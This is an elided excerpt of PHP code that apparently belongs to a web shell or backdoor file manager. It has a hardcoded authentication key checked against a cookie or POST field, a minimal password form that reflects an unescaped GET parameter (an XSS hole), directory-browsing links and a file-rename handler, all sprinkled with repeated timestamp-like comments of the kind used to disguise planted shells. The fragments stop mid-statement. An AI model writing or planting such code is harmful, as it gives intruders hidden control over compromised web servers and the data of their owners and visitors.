...
$auth_key = "2ff203e11958d8a1ff7aa0b6a0a30ddc";
...
$pass = false;
if (isset($_COOKIE['pw_name_40581'])) {
    if(($_COOKIE['pw_name_40581']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_40581'])) {
        if(($_POST['pw_name_40581']) == $auth_key) {
            setcookie("pw_name_40581", $_POST['pw_name_40581']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_40581' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726249858452060 1726249858845366 1726249858602180 1726249858503212
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726249858452060 1726249858845366 1726249858602180 1726249858503212
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726249858452060 1726249858845366 1726249858602180 1726249858503212
            $name = PATH . "/" . $_GET['r'];
